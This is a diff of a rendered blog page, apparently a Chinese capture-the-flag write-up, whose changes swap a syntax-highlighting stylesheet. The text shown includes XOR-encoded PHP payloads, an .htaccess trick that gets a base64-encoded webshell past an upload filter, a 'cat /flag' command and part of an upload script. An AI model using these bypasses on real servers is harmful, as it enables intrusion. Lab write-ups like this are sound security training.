@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="n-A-n"><a href="#n-A-n" class="headerlink" title="n_A_n"></a><code>n_A_n</code></h2><div class="hljs"><pre><code><pre><code class="hljs php">	 <span class="hljs-meta">&lt;?php</span>
+              <h2 id="n-A-n"><a href="#n-A-n" class="headerlink" title="n_A_n"></a><code>n_A_n</code></h2><pre><code><pre><code class="hljs php">	 <span class="hljs-meta">&lt;?php</span>
 	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;
 	    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span>
 	    $userdir = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);
@@ -333,20 +341,20 @@
 	<span class="hljs-keyword">print</span>(_)
 	<span class="hljs-keyword">print</span>(G)
 	<span class="hljs-keyword">print</span>(E)
-	<span class="hljs-keyword">print</span>(T)</code></pre></div></code></pre>
+	<span class="hljs-keyword">print</span>(T)</code></pre></code></pre>
 <p>构造<code>$_GET[a]();&amp;a=phpinfo</code><br><img src="https://sc02.alicdn.com/kf/U71602567344d4ae2afee14ccff8f185ek.jpg" srcset="/img/loading.gif" alt="01.png"><br>payload:<code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=phpinfo</code>    </p>
 <p>然后执行<code>get_the_flag()</code>函数<br><code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=get_the_flag</code>       </p>
 <p>上传文件<br>过滤了<code>ph/i</code><br>考虑<code>.user.ini</code>或者<code>.htaccess</code><br><code>.user.ini</code>需要上传的目录里有可执行的PHP文件，这里显然没有         </p>
 <p><code>.htaccess</code><br>因为有头文件检测，一般用GIF89a，看WP说是会使文件失效；我试了下，发现上传失败；用<code>#define width 1337#define height 1337 </code>可以绕过   </p>
-<div class="hljs"><pre><code>    #define width 1337
+<pre><code>    #define width 1337
     #define height 1337
     AddType application/x-httpd-php .ahhh    ##将.ahhh后缀的文件以PHP解析
-    php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh </code></pre></div>
+    php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh </code></pre>
 <p>最后一句的解释：<br><img src="https://ae02.alicdn.com/kf/Ued9c20fc4b034016b3961677278461e7l.jpg" srcset="/img/loading.gif" alt="05.png">    </p>
 <p>过滤了<code>&lt;?</code><br><code>&lt;script language=&quot;php&quot;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code>也不能用，php版本7.x的         </p>
 <p>base64编码，在<code>.htaccess</code>里解码         </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/105615235">大佬的上传脚本</a>         </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> base64
 
 htaccess = <span class="hljs-string">b&quot;&quot;&quot;</span>
@@ -365,7 +373,7 @@ print(response.text)
 
 files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;
 response = requests.post(url=url, data=data, files=files)
-print(response.text)</code></pre></div></code></pre>
+print(response.text)</code></pre></code></pre>
 <p><img src="https://ae04.alicdn.com/kf/U8ab36d268f2c4e338ff91bd9e73355d6W.jpg" srcset="/img/loading.gif" alt="02.png">         </p>
 <p>访问一句话文件，<img src="https://ae02.alicdn.com/kf/U1b0011f9ec664565ad977d32c46423b74.jpg" srcset="/img/loading.gif" alt="03.png"><br>可用<br>但没法直接读文件<br>需要绕过<code>open_basedir</code>          </p>
 <p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E5%89%8D%E8%A8%80">从PHP底层看open_basedir bypass</a>         </p>
@@ -516,6 +524,8 @@ print(response.text)</code></pre></div></code></pre>
 
 
 
+  
+    
   
 
 
